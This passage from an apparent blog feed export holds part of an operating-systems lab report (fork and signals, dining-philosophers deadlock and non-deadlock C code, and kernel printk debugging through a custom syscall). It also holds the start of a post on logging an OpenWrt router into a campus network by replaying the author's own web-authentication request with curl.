class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Signal handler function</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signalHandler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bye, World!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Child process</span></span><br><span class="line">    </span><br><span class="line">        signal(SIGUSR1, signalHandler); <span class="comment">// Register signal handler function</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;I am Child Process, alive!\n&quot;</span>);</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Parent process</span></span><br><span class="line">        <span class="type">char</span> answer;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;To terminate Child Process. Yes or No?\n&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>, &amp;answer);</span><br><span class="line">            <span class="keyword">if</span> (answer == <span class="string">&#x27;N&#x27;</span> || answer == <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                sleep(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (answer != <span class="string">&#x27;Y&#x27;</span> &amp;&amp; answer != <span class="string">&#x27;y&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        kill(pid, SIGUSR1); <span class="comment">// Send SIGUSR1 signal to child process</span></span><br><span class="line">        wait(<span class="literal">NULL</span>); <span class="comment">// Wait for child process to end</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// fork failed</span></span><br><span class="line">        perror(<span class="string">&quot;fork failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Code execution result:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/5-result.png"alt="Code execution result" /><figcaption aria-hidden="true">Code execution result</figcaption></figure><p>Reference Materials:</p><p><a href="https://zhuanlan.zhihu.com/p/113876980">Linux Inter-ProcessCommunication Lecture 3 Signal signal kill</a></p><h2id="task-6-simulate-dining-philosophers-in-windows-or-linux-provide-deadlock-and-non-deadlock-solutions">Task6: Simulate Dining Philosophers in Windows or Linux, Provide Deadlockand Non-Deadlock Solutions</h2><p>Task Requirements:</p><ol type="1"><li>Provide both solutions that may cause deadlock and solutions thatcannot cause deadlock.</li><li>For solutions that may cause deadlock, refer to course materials.Windows try using critical section objects (EnterCriticalSection,LeaveCriticalSection); Linux try using mutex locks (pthread_mutex_lock,pthread_mutex_unlock)</li><li>Solutions that absolutely cannot cause deadlock, for example: try topick up both chopsticks, if both can be picked up then pick them up,otherwise don’t pick up either.</li><li>Linux try mutex functions pthread_mutex_lock, pthread_mutex_trylock,etc.</li><li>To enhance randomness, maintain random duration of 100ms-500msbetween states.</li><li>[Optional] Graphical interface showing philosophers picking upchopsticks, eating, putting down chopsticks, thinking, etc.</li></ol><h3 id="deadlock-solution">Deadlock Solution</h3><p>The problem with the deadlock solution is that each philosopher picksup the left chopstick first, then the right chopstick. When they allpick up the left chopstick simultaneously, no philosopher can get theright chopstick, creating a deadlock problem.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PHILOSOPHER_COUNT 5</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> chopsticks[PHILOSOPHER_COUNT];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_random_sleep_time</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> rand() % <span class="number">400000</span> + <span class="number">100000</span>; <span class="comment">// 100ms到500ms的随机时间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">philosopher</span><span class="params">(<span class="type">void</span> *num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> id = *(<span class="type">int</span> *)num;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d is thinking\n&quot;</span>, id);</span><br><span class="line">        usleep(get_random_sleep_time()); <span class="comment">// Random thinking time</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d is resting\n&quot;</span>, id);</span><br><span class="line">        usleep(get_random_sleep_time()); <span class="comment">// Random rest time</span></span><br><span class="line"></span><br><span class="line">        pthread_mutex_lock(&amp;chopsticks[id]); <span class="comment">// Pick up left chopstick</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d picked up left chopstick\n&quot;</span>, id);</span><br><span class="line">        pthread_mutex_lock(&amp;chopsticks[(id + <span class="number">1</span>) % PHILOSOPHER_COUNT]); <span class="comment">// Pick up right chopstick</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d picked up right chopstick\n&quot;</span>, id);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d is eating\n&quot;</span>, id);</span><br><span class="line">        usleep(get_random_sleep_time()); <span class="comment">// Random eating time</span></span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;chopsticks[(id + <span class="number">1</span>) % PHILOSOPHER_COUNT]); <span class="comment">// Put down right chopstick</span></span><br><span class="line">        pthread_mutex_unlock(&amp;chopsticks[id]);                           <span class="comment">// Put down left chopstick</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> philosophers[PHILOSOPHER_COUNT];</span><br><span class="line">    <span class="type">int</span> philosopher_numbers[PHILOSOPHER_COUNT];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_mutex_init(&amp;chopsticks[i], <span class="literal">NULL</span>);</span><br><span class="line">        philosopher_numbers[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_create(&amp;philosophers[i], <span class="literal">NULL</span>, philosopher, &amp;philosopher_numbers[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(philosophers[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Deadlock state:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/6-program1-result.png"alt="Deadlock state" /><figcaption aria-hidden="true">Deadlock state</figcaption></figure><p>It can be observed that they all picked up the left chopstickssimultaneously, creating a deadlock phenomenon.</p><h3 id="non-deadlock-solution">Non-Deadlock Solution</h3><p>My solution to deadlock is that philosophers try to pick up the leftchopstick first, then the right chopstick. Unlike the above, ifphilosophers cannot get the right chopstick to eat, they put down theleft chopstick they currently hold, thus avoiding the deadlockproblem.</p><p>In terms of specific functions: pthread_mutex_trylock functionreplaces pthread_mutex_lock to avoid blocking. If the lock cannot beacquired immediately, it won’t enter a waiting state, thus avoidingdeadlock situations.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PHILOSOPHER_COUNT 5</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> chopsticks[PHILOSOPHER_COUNT];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_random_sleep_time</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> rand() % <span class="number">400000</span> + <span class="number">100000</span>; <span class="comment">// 100ms到500ms的随机时间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">philosopher</span><span class="params">(<span class="type">void</span> *num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> id = *(<span class="type">int</span> *)num;</span><br><span class="line">    <span class="type">int</span> left = id;</span><br><span class="line">    <span class="type">int</span> right = (id + <span class="number">1</span>) % PHILOSOPHER_COUNT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d is thinking\n&quot;</span>, id);</span><br><span class="line">        usleep(get_random_sleep_time()); <span class="comment">// Random thinking time</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d is resting\n&quot;</span>, id);</span><br><span class="line">        usleep(get_random_sleep_time()); <span class="comment">// Random thinking time</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Each philosopher tries to get the left chopstick first, then the right chopstick. If both chopsticks are successfully acquired, the philosopher starts eating</span></span><br><span class="line">        <span class="comment">// pthread_mutex_trylock function replaces pthread_mutex_lock to avoid blocking. If the lock cannot be acquired immediately, it won&#x27;t enter a waiting state, thus avoiding deadlock situations</span></span><br><span class="line">        <span class="keyword">if</span> (pthread_mutex_trylock(&amp;chopsticks[id]) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d picked up left chopstick\n&quot;</span>, id);</span><br><span class="line">            sleep(<span class="number">1</span>); <span class="comment">// Added a 1-second delay here to make it easier for philosophers to pick up left chopsticks simultaneously</span></span><br><span class="line">            <span class="keyword">if</span> (pthread_mutex_trylock(&amp;chopsticks[(id + <span class="number">1</span>) % PHILOSOPHER_COUNT]) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d picked up right chopstick\n&quot;</span>, id);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d is eating\n&quot;</span>, id);</span><br><span class="line">                usleep(get_random_sleep_time()); <span class="comment">// Random eating time</span></span><br><span class="line"></span><br><span class="line">                pthread_mutex_unlock(&amp;chopsticks[(id + <span class="number">1</span>) % PHILOSOPHER_COUNT]);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d put down right chopstick\n&quot;</span>, id);</span><br><span class="line">            &#125;</span><br><span class="line">            pthread_mutex_unlock(&amp;chopsticks[id]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Philosopher %d put down left chopstick\n&quot;</span>, id);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> philosophers[PHILOSOPHER_COUNT];</span><br><span class="line">    <span class="type">int</span> philosopher_numbers[PHILOSOPHER_COUNT];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_mutex_init(&amp;chopsticks[i], <span class="literal">NULL</span>);</span><br><span class="line">        philosopher_numbers[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_create(&amp;philosophers[i], <span class="literal">NULL</span>, philosopher, &amp;philosopher_numbers[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(philosophers[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Non-deadlock program execution result:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/6-program2-result.png"alt="Non-deadlock program execution result" /><figcaption aria-hidden="true">Non-deadlock program executionresult</figcaption></figure><p>Here I intentionally made philosophers sleep for a longer time aftergetting the left chopstick, creating a conflict where they all get theleft chopstick simultaneously. From the figure, we can see that all 5philosophers indeed picked up the left chopsticks simultaneously. Unlikethe deadlock approach, philosopher 4 actively put down the leftchopstick and re-entered the thinking state, avoiding the deadlocksituation.</p><p>Reference Materials:</p><p><ahref="https://blog.csdn.net/monologuezjp/article/details/85449544">DiningPhilosophers Problem</a></p><p><ahref="https://blog.csdn.net/low5252/article/details/104800671">FivePhilosophers Dining Problem</a></p><h2id="task-7-study-linux-kernel-and-use-printk-to-debug-process-creation-and-scheduling-policy-related-information">Task7: Study Linux Kernel and Use printk to Debug Process Creation andScheduling Policy Related Information</h2><p>Requirements: Write application Hello.c, call fork to create process,track the fork process of the newly created child process in the kerneland display PCB member variables related to scheduling policy.</p><ol type="1"><li>Write application Hello.c, call fork to create child process(functionality unlimited), print parent and child process IDnumbers.</li><li>Use printk in appropriate locations in the kernel (such as somewherein the do_fork function) to output debugging information like “currentlycreating process corresponding cmd, process ID and parent processID”.</li><li>To avoid frequent output of the above debugging information by thedo_fork function, it must be limited to only output the above debugginginformation when fork is called in the Hello program. Please think abouthow to implement this.</li></ol><blockquote><p>Reference method: Kernel design global variable bool flag and systemcall SetDebug(bool), SetDebug can modify flag value to true or false. Inthe Hello program, call SetDebug(true) before calling fork function andSetDebug(false) after calling fork function to modify flag. When printkdebugging information, check flag to determine whether to use printk tooutput debugging information.</p></blockquote><p>Friendly reminder: The do_fork function has been replaced by thekernel_clone function in newer versions of Linux kernel source code.</p><h3 id="modify-.kernelfork.c-file">Modify ./kernel/fork.c file</h3><p>Use printk in kernel_clone to print related information. p is apointer to the task_struct structure, comm is the currently executingcommand, pid is the child process ID, current-&gt;pid is the parentprocess ID, current is a macro pointing to the parent process.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/7-add_code.png"alt="Add printk code in kernel_clone" /><figcaption aria-hidden="true">Add printk code inkernel_clone</figcaption></figure><p>Add new system call setdebug for setting debug_fork_flag. The boolvalue debug_fork_flag is a global variable used to control whether tooutput.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/7-setdebug.png"alt="setdebug system call" /><figcaption aria-hidden="true">setdebug system call</figcaption></figure><h3 id="add-declarations">Add Declarations</h3><ol type="1"><li>System call: ./kernel/fork.c (already modified)</li><li>System call function declaration ./include/linux/syscalls.h</li><li>ID: ./arch/x86/entry/syscalls/syscall_64.tbl</li><li>ID declaration: ./include/uapi/asm-generic/unistd.h</li></ol><p>The modification operations for the remaining 3 files have beenpracticed in the task of adding system calls in experiment 1, so I won’trepeat them here.</p><h3 id="compile-kernel">Compile Kernel</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Already practiced in experiment 1 kernel compilation</span></span><br><span class="line">make mrproper</span><br><span class="line">make clean</span><br><span class="line">make -j6</span><br><span class="line">make modules_install</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h3 id="write-test-code">Write Test Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Define SetDebug system call number (needs to be registered in kernel)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_SETDEBUG 447</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SetDebug</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">    syscall(SYS_SETDEBUG, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    SetDebug(<span class="number">1</span>); <span class="comment">// Enable debug information</span></span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// Child process</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Child process ID: %d\n&quot;</span>, getpid());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// Parent process</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Parent process ID: %d\n&quot;</span>, getpid());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// fork failed</span></span><br><span class="line">        perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SetDebug(<span class="number">0</span>); <span class="comment">// Disable debug information</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To test the functionality, I commented out the SetDebug function inanother test code and executed both programs simultaneously. Theexpected effect is that only the program that called the SetDebugfunction will output debug information during fork.</p><p>test1 did not enable print information, test2 enabled printinformation.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/7-result1.png"alt="Run test1 and test2" /><figcaption aria-hidden="true">Run test1 and test2</figcaption></figure><p>Use dmesg to view information. In the figure below, we can see a linein the background information about a process being created, cmd=test2,and comparing with the child process and parent process PIDs in theabove figure, they are also consistent.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/7-result2.png"alt="dmesg print background information" /><figcaption aria-hidden="true">dmesg print backgroundinformation</figcaption></figure><p>Reference Materials:</p><p><a href="https://zhuanlan.zhihu.com/p/617398860">Linux Kernel Process- do_fork() Function Implementation Principle</a></p><p><ahref="https://blog.csdn.net/liushengxi_root/article/details/81332740">LinuxKernel Source Code fork Interpretation</a></p>]]></content>
      
      
      <categories>
          
          <category> HUST Lab Reports </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Course Experiments </tag>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Campus Network Router Connection with Web Authentication</title>
      <link href="/2023/02/17/Tools/Campus%20Network%20Router%20Connection%20with%20Web%20Authentication/"/>
      <url>/2023/02/17/Tools/Campus%20Network%20Router%20Connection%20with%20Web%20Authentication/</url>
      
        <content type="html"><![CDATA[<h1 id="requirements">Requirements</h1><p>Due to the device quantity limitations of campus network, I wanted touse the campus wired network to connect my own router to remove devicequantity restrictions, and implement so-called hardware VPN, wheretraffic is forwarded through the router to a proxy server, so thatdevices in the network formed by this router don’t need to start VPNsoftware, saving some trouble.</p><h1 id="difficulties-and-solutions">Difficulties and Solutions</h1><p>Campus network is different from home network, requiring webauthentication to connect. Initially, I thought I could just buy aready-made router (ASUS TUF AX3000) and connect it for authentication,but it turned out that the authentication interface wouldn’t pop up. SoI bought a soft router R2S (essentially a microcomputer) and installed<a href="https://zh.wikipedia.org/zh-hans/OpenWrt">OpenWrt</a> system asthe upper-level router, because it’s essentially an embedded Linuxsystem with command-line tools, and I can use the <code>curl</code>command to send HTTP requests to the campus network authenticationinterface (HUST uses 192.168.50.3) to achieve login. As for VPN, I justneed to configure the subscribed proxy server address in the soft routersoftware. Yes, it’s essentially still software VPN, but it’s handled bythe gateway.</p><h1 id="process-demonstration">Process Demonstration</h1><h2 id="equipment-preparation">Equipment Preparation</h2><p>One router, one soft router, two network cables, one computer.</p><h2id="using-network-packet-capture-to-get-http-request-content-value-for-campus-network-authentication">UsingNetwork Packet Capture to Get HTTP Request Content Value for CampusNetwork Authentication</h2><p>First, connect one end of a network cable to the campus wired networkport, and the other end to your computer. Access the campus networkauthentication interface through a browser, preferably with WiFidisabled. Enter your account and password in advance, <strong>but don’tclick login</strong>. <imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2023-02-16%2020.01.16.png" /></p><h3 id="enter-developer-mode">Enter Developer Mode</h3><p>Press F12 to enter the browser’s developer mode, take a general look,and understand the webpage’s logic, specifically the login function <imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2023-02-16%2020.05.27.png" /></p><h3 id="set-breakpoint-at-post-location">Set Breakpoint at POSTLocation</h3><p>Just like debugging code normally. <imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2023-02-16%2020.06.24.png" /></p><h3 id="click-login-to-get-content-value">Click Login to Get ContentValue</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2023-02-16%2020.27.04.png" /></p><h3 id="use-curl-command-to-send-request">Use curl Command to SendRequest</h3><p>Write a shell script, or don’t write one at all. <imgsrc="https://picx.zhimg.com/80/v2-285e2cea8e82f818410f32dd796559b3_1440w.png" />After using the chmod command to give it execution permissions, executethe script. If the return value is “success”, it means the commandexecuted successfully and completed campus network authentication; ifnot successful, repeat the content acquisition operation, as I alsofailed the first time. ## Configure Soft Router</p><h3 id="install-openwrt-system">Install OpenWrt System</h3><p>Since there are many open-source options on GitHub, the effectsshould be similar, so you can choose any one. Most soft routers boughton Taobao come pre-installed. If you have a completely new machine,refer to the video below to install the OpenWrt system.<div class="video-container"><iframe 